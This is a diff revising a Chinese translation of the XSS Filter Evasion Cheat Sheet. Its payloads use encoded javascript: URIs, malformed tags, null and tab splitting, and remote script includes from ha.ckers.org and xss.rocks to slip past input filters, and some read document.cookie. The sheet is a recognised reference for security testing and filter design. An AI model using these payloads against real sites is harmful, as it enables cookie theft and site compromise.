@@ -68,9 +68,9 @@ XSS Filter Evasion Cheat Sheet 中文版
 
 ------
 ##html 实体##
-The semicolons are required for this to work:
+需要用到分号
 
-    <IMG SRC=javascript:alert("XSS")>
+    <IMG SRC=javascript:alert(&quot;XSS&quot;)>
 
 -----
 ##重音符混淆##
@@ -80,29 +80,29 @@ The semicolons are required for this to work:
 
 -----
 ##畸形的A标签##
-跳过href属性，而直接获取xss实质攻击代码...提出被David Cross ~ 已验证在chrome浏览器
+跳过href属性，而直接获取xss实质攻击代码...由David Cross提出 ~ 已在chrome浏览器验证
 
     <a onmouseover="alert(document.cookie)">xxs link</a>
 
-此外，chrome浏览器喜欢去补全缺失的引号为你。如果你遇到阻碍那么直接省略它们吧，chrome将会正确的帮你补全缺失的引号在URL和script中。
+此外，chrome浏览器喜欢为你补全缺失的引号。如果你遇到阻碍那么直接省略它们吧，chrome将会在URL和script中正确的帮你补全缺失的引号。
 
     <a onmouseover=alert(document.cookie)>xxs link</a>
 
 ------
 ##畸形的IMG标签##
-最早被 Begeek发现（可以短小而干净的运行于任何浏览器），这个xss向量依靠松散的渲染引擎解析IMG标签中被引号包含的字符串来实现。我猜测它最初是为了正确编码而这样实现，但这样让它更加困难去解析html。
+最早被 Begeek发现（可以短小而干净的运行于任何浏览器），利用了松散的渲染引擎。将xss向量用双引号包裹，包含在IMG标签中。我猜测它最初是为了正确编码而这样实现，但这样让它解析html变得更加困难。
 
     <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
 
 -----
 ##fromCharCode##
-如果没有任何形式的引号被允许，你可以eval()一串fromCharCode在javascript中来创建任何你需要的xss向量。
+如果不允许使用引号，可以在javascript中eval()一串fromCharCode来创建任何需要的xss向量。
 
     <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
 
 -----
 ##默认SRC属性去绕过SRC域名检测过滤器##
-这将绕过绝大多数SRC域名过滤器。插入javascript代码在任何一个事件方法同样适用于任何一个HTML标签，例如Form、Iframe、Input、Embed等等。它也允许任何该标签的相关事件去替换，例如onblur, onclick等，后面我们会附加一个可用的事件列表。由David Cross提供，Abdullah Hussam编辑。
+这将绕过绝大多数SRC域名过滤器。在事件方法中插入javascript适用于任意可以使用Form, Iframe, Input, Embed等元素注入的HTML标签类型。它允许任何该标签的相关事件用于替换，例如onblur, onclick等，后面我们会附加一个可用的事件列表。由David Cross提供，Abdullah Hussam编辑。
 
     <IMG SRC=# onmouseover="alert('xxs')">
 
@@ -123,26 +123,26 @@ The semicolons are required for this to work:
 
 ----
 ##十进制html编码引用##
-所有在<IMG>中使用javascript指令的xss示例将无法工作在 Firefox 或 Netscape 8.1+，因为它们使用了 Gecko 渲染引擎。使用 XSS [Calculator][2] 获取更多信息。
+所有直接在 ==<IMG==标签中使用javascript的xss例子都无法在使用了Gecko渲染引擎的Firefox或Netscap8.1+中成功运行。
 
     <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;
     &#39;&#88;&#83;&#83;&#39;&#41;>
 
 -----
 ##结尾没有分号的十进制html编码引用##
-它是经常有用的在绕过寻找"&#XX;"格式的xss过滤，因为大多数人不知道最多允许7位字符的编码限制。这也是有用的对那些对字符串解码像$tmp_string =~ s/.*\&#(\d+);.*/$1/; 的过滤器,它们错误的认为一个html编码必须要用;去结束。（我是无意中发现）
+在绕过 ==&#XX;== 格式的XSS过滤时非常有用，因为大多数人不知道最多允许7位字符的编码限制。在应对某些人使用类似 ==$tmp_string=~s/.*\&#(\d+);.*/$1/;== 解码字符串时同样有用，它错误地认为一个html编码一定要用;结束。（我是无意中发现的）
 
     <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
 
 -----
 ##结尾没有分号的十六进制html编码引用##
-这也是一种实用的xss攻击针对上文的$tmp_string =~ s/.*\&#(\d+);.*/$1/; ，错误的认为数字编码跟随在#后面（十六进制htnl编码并非如此），。使用 XSS [Calculator][3] 获取更多信息。
+这也是一种实用的xss攻击针对上文的$tmp_string =~ s/.*\&#(\d+);.*/$1/; ，错误的认为数字编码跟随在#后面（十六进制htnl编码并非如此）。
 
     <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
 
 ----
 ##内嵌TAB##
-用来分开xss攻击代码
+用来分开xss攻击代码。一些网站声称09-13编码的所有字符（十进制）都可以实现这种形式的攻击。这是不正确的。只有09(tab), 10 (换行) 和 13 (回车)可以使用。你可以查看ascii表获取更详细的信息。下面四个xss例子展示了这个向量。
 
     <IMG SRC="jav	ascript:alert('XSS');">
 
@@ -154,7 +154,6 @@ The semicolons are required for this to work:
 
 -----
 ##内嵌换行符去分开xss代码##
-一些网站声称09-13编码的所有字符（十进制）都可以实现这种形式的攻击。这是不正确的。只有09(tab), 10 (换行) 和 13 (回车)可以使用。你可以查看ascii表为更详细的信息。下面四个xss例子展示了这个向量。
 
     <IMG SRC="jav&#x0A;ascript:alert('XSS');">
 
@@ -165,58 +164,58 @@ The semicolons are required for this to work:
     <IMG SRC="jav&#x0D;ascript:alert('XSS');">
 
 ----
-##没有分割的javascript指令##
-null字符也可以作为一个xss向量，但不同于上面。你需要直接注入它们利用一些工具例如Burp Proxy，或是使用 %00 在你的url字符串里。或者如果你想写你自己的注入工具你可以使用vim（^V^@ 会生成null），以及用下面的程序去生成它到一个文本文件中。好吧，我再一次撒谎了。 Opera的老版本（大约 7.11 on Windows）是脆弱的对于一个额外的字符173（软连字符）。但是null字符 %00 是更加的有用或者帮助我们绕过某些真实存在的过滤器通过变动像这个例子中的。
+##null分割的javascript指令##
+null字符也可以作为一个xss向量，但不同于上面。你需要它们利用一些工具例如Burp Proxy直接注入，或是在你的url字符串里使用 %00 。或者如果你想写你自己的注入工具你可以使用vim（^V^@ 会生成null），以及用下面的程序将它生成到一个文本文件中。好吧，我再一次撒谎了。 Opera的老版本（大约 7.11 on Windows）对一个额外的字符173（软链接控制字符）是脆弱的。但是null字符 %00 更加有用了，它通过变量帮助我绕过某些真实存在的过滤器，比如这个例子
 
     perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
 
 ------
-##IMG中javascript之前添加空格和元字符为xss绕过##
-xss过滤拼配模式没有考虑单词"javascript:"中可能存在空格是正确的，因为否则将无法渲染。但是这也导致了错误的假设认为你不可以有一个空格在引号和 "javascript:" 单词之间。事实上你可以插入 1-32编码字符（十进制）中的任何字符。
+##为xss在IMG中的javascript前添加空格和元字符##
+模式串不考虑"javascript:"中存在空格的问题时，这一例子有效。这当然是正确的，否则就没办法进行渲染，但是模式串错误地认为在你的引号和"javascript:"之间不会存在空格，而事实是你可以在其间插入1-32的任意十进制字符。
 
     <IMG SRC=" &#14;  javascript:alert('XSS');">
 
 ------
 ##非字母数字字符的xss##
- Firefox html解析器认为一个非数字字母的字符在一个html关键字中不是有效的，因此这些字符会被视为空白符或是无效的token在html标签之后。这导致很多xss过滤器错误的认为html标签必须是被空白符隔断的。例如，"<SCRIPT\s" != "<SCRIPT/XSS\s":
+ Firefox html解析器认为一个非数字字母的字符在一个html关键字后是无效的，因此这些字符会被视为html标签后的空白符或是无效token。这导致很多xss过滤器错误的认为html标签必须是被空白符隔断的。例如认为，"<SCRIPT\s" != "<SCRIPT/XSS\s":
 
-    <SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+    <SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
 
-和上面的原理相同，我们继续扩大，Gecko渲染引擎允许字母、数字、html封装字符以外的任何字符位于事件处理器与等号之间。借此我们可以绕过xss过滤器。注意这也是适用于重音符如下所示：
+和上面的原理相同，我们继续扩展，Gecko渲染引擎允许字母、数字、html封装字符以外的任何字符位于事件处理器与等号之间。借此我们可以绕过xss过滤器。注意这也适用于重音符：
 
     <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
 
-Yair Amit 提示我有一个小区别在 ie和Gecko 渲染引擎之间是在不使用空格的情况下，Gecko仅允许一个斜杠在html标签和参数之间。这可能是有用的在那些不允许输入空格的系统中。
+Yair Amit 提示我在ie和Gecko 渲染引擎之间有一个小区别。Gecko仅允许html标签和参数之间存在一个斜杠且没有空格。这在那些不允许输入空格的系统中有效。
 
-    <SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+    <SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
 
 -----
 ##额外的开括号##
- Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，因为这些引擎通过拼配最早出现的一对尖括号，并且提取其内部内容作为标签，而没有使用更加有效的算法例如 Boyer-Moore（寻找打开的尖括号以及相关标签的模糊拼配）。最后，代码中的双斜杠可以抑制额外尖括号导致的javascript错误。
+ Franz Sedlmaier提出，利用这个xss向量可以绕过某些检测引擎，因为这些引擎通过匹配最早出现的一对尖括号，并且提取其内容比对标签，而没有使用更加有效的算法例如 Boyer-Moore（寻找打开的尖括号以及相关标签的模糊拼配）。最后，代码中的双斜杠可以抑制额外尖括号导致的javascript错误。
 
     <<SCRIPT>alert("XSS");//<</SCRIPT>
 
 ------
 ##没关闭的script标签##
-对于使用了 Gecko渲染引擎的Firefox 和 Netscape 8.1 ，你并不需要常规xss中">&#x3C;&#x2F;&#x53;&#x43;&#x52;&#x49;&#x50;&#x54;&#x3E;"这部分。 Firefox会帮你闭合标签，并且加入结束标签。多么的体贴啊！ Unlike the next one, which doesn't effect Firefox, this does not require any additional HTML below it. 如果需要，你可以加入引号，但通常他并不是必须的。注意，我并不清楚这个代码被注入后html代码会闭合成什么样子。
+对于使用了 Gecko渲染引擎的Firefox 和 Netscape 8.1 ，你并不需要常规xss中">&#x3C;&#x2F;&#x53;&#x43;&#x52;&#x49;&#x50;&#x54;&#x3E;"这部分。 Firefox会帮你闭合标签，并且加入结束标签。多么的体贴啊！ 不像下个例子，该例不需要添加任何额外的HTML。 如果需要，你可以加入引号，但通常他并不是必须的。注意，我并不清楚这个代码被注入后html代码会闭合成什么样子。
 
     <SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
 
 -----
 ##script标签中的协议解析#
-这个特殊的变体由 Łukasz Pilorz 提出，并且基于上文中 Ozh提出的协议解析绕过。这个xss例子工作在 IE, 使用IE渲染引擎的Netscape 以及加了</SCRIPT>在结尾的 Opera。这是非常有用的在输入长度受到限制。域名越短越好。 ".j"是有效的，不需要考虑编码问题因为浏览拿起可以自动识别在一个script标签中。
+这个特殊的变体由 Łukasz Pilorz 提出，并且基于上文中 Ozh提出的协议解析绕过。这个xss例子工作在 IE, 使用IE渲染引擎的Netscape，如果在结尾加了</SCRIPT>，也可用于 Opera。在输入长度受到限制时这是非常有用的。域名越短越好。 无论编码类型是什么，".j"都是有效的，因为浏览器可以自动识别script标签中的内容。
 
     <SCRIPT SRC=//ha.ckers.org/.j>
 
 ----
 ##半开的HTML/JavaScript xss向量##
-不同于 Firefox ，ie渲染引擎不会加入额外的数据到你的页面。但是它允许javascript指令在IMG标签中，这是有用的作为一个xss向量，因为它不需要一个结束的尖括号。你可以使用这个xss向量在任何html标签中，甚至没有用">"闭合标签。 A note: this does mess up the HTML, depending on what HTML is beneath it. It gets around the following NIDS regex: /((\%3D)|(=))[^\n]*((\%3C)|<)[^\n]+((\%3E)|>)/ because it doesn't require the end ">". 它也是有效的去对付真实的xss过滤器，我曾经用半开的<IFRAME 标签替代 <IMG 标签去绕过过滤器。
+不同于 Firefox ，ie渲染引擎不会加入额外的数据到你的页面。但是它允许在IMG标签中存在javascript指令，作为一个xss向量这是很有用的，因为它不需要一个结束的尖括号。你可以在任何html标签中使用这个xss向量，甚至没有用">"闭合标签。提示:这会使HTML感到混乱，具体取决于HTML下面的HTML。 它绕过了以下NIDS正则表达式: /((\%3D)|(=))[^\n]*((\%3C)|<)[^\n]+((\%3E)|>)/ 因为它不要求有闭括号">"。边注：它对付真实的xss过滤器也是有效的，我曾经用半开的<IFRAME 标签替代 <IMG 标签去绕过过滤器。
 
     <IMG SRC="javascript:alert('XSS')"
 
 ------
 ##双开尖括号##
-使用一个开始尖括号(<)在向量结尾代替一个关闭尖括号（>）会有不同的影响在 Netscape Gecko 的渲染中。 Without it, Firefox will work but Netscape won't。
+使用一个开始尖括号(<)在向量结尾代替一个关闭尖括号（>）在Netscape Gecko 的渲染中会有不同的影响。没有关闭尖括号，Firefox会正常工作而 Netscape不会。
 
     <iframe src=http://ha.ckers.org/scriptlet.html <
 
@@ -839,10 +838,4 @@ Robert "RSnake" Hansen
 ##翻译##
 老道( dao#yiye.me )
 
-  [1]: http://ha.ckers.org/xsscalc.html
-  [2]: http://ha.ckers.org/xsscalc.html
-  [3]: http://ha.ckers.org/xsscalc.html
-  [4]: http://help.dottoro.com/
-  [5]: http://help.dottoro.com/ljfvvdnm.php
-  [6]: https://tools.ietf.org/html/rfc2397
-  [7]: http://ha.ckers.org/xsscalc.html
+
